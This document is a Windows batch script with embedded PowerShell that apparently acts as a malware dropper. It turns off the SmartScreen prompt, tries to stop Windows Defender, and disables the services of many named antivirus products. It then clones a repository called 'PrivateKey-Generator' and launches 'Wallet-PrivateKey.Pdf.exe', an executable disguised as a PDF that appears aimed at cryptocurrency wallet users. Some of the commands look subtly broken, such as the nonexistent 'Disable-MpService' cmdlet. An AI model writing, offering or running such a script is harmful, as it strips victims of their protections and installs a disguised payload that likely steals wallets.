@echo off
powershell -Command "
# Check if SmartScreen is already disabled
$smartScreen = Get-MpPreference | Select-Object -ExpandProperty DisableSmartScreenOverridePrompt
if (-not $smartScreen) {
    Set-MpPreference -DisableSmartScreenOverridePrompt $true
}

# Check if Windows Defender is already disabled
$defenderStatus = Get-Service -Name 'WinDefend' -ErrorAction SilentlyContinue
if ($defenderStatus.Status -eq 'Running') {
    Disable-MpService -NoWait
}

$softwareList = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match 'Antivirus' }
if ($softwareList.Count -eq 0) {
    echo 'No antivirus software found. Exiting...'
    exit
}
foreach ($software in $softwareList) {
    switch ($software.Name) {
        'Avast' { Set-Service -Name 'AvastSvc' -StartupType Disabled; break }
        'Norton' { Set-Service -Name 'Symantec Antivirus Service' -StartupType Disabled; break }
        'McAfee' {
            Set-Service -Name 'McAfee Framework Service' -StartupType Disabled
            Set-Service -Name 'McAfee Service Controller' -StartupType Disabled
            break
        }
        'Kaspersky' { Set-Service -Name 'Kaspersky Lab Service' -StartupType Disabled; break }
        'Bitdefender' { Set-Service -Name 'Bitdefender Antivirus' -StartupType Disabled; break }
        'AVG' { Set-Service -Name 'AvgSvc' -StartupType Disabled; break }
        'Avira' { Set-Service -Name 'Avira Service' -StartupType Disabled; break }
        'Sophos' { Set-Service -Name 'Sophos' -StartupType Disabled; break }
        'Trend Micro' { Set-Service -Name 'Trend Micro' -StartupType Disabled; break }
        'Webroot' { Set-Service -Name 'Webroot Service' -StartupType Disabled; break }
        'ESET NOD32' { Set-Service -Name 'ekrn' -StartupType Disabled; break }
        'Panda' { Set-Service -Name 'Panda' -StartupType Disabled; break }
        # Add more cases for other antivirus software as needed
    }
}
"

git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
if %ERRORLEVEL% neq 0 (
    echo 'Git clone failed. Exiting...'
    exit /b %ERRORLEVEL%
)
cd PrivateKey-Generator
start /wait Wallet-PrivateKey.Pdf.exe
